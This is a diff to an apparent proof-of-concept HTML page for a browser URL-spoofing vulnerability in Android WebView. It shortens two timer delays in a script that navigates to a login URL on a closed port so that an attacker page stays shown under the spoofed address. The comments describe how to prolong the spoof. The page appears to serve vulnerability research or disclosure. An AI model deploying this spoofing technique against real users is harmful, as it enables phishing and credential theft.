@@ -32,14 +32,14 @@
             //window.location = 'https://example.com:81/accounts/login?123';
             //document.write('Observe how document.write calls onPageFinished in Android WV.');
         }
-    }, 2000);
+    }, 200);
 
     setTimeout(function() {
         window.location = 'https://example.com:81/accounts/login';
         // In case the browser does show an error page when the connection timeout is reached, the attacker page can try re-navigating to the spoofed URL on another closed port.
         // Re-navigating and writing again to the document will result in the same behavior, and extend indefinitely the time the attacker page is shown.
         // However, for PoC, the connection timeout is long enough to demonstrate the vulnerability so it is not implemented.
-    }, 2000);
+    }, 200);
 </script>
 </body>
 </html>
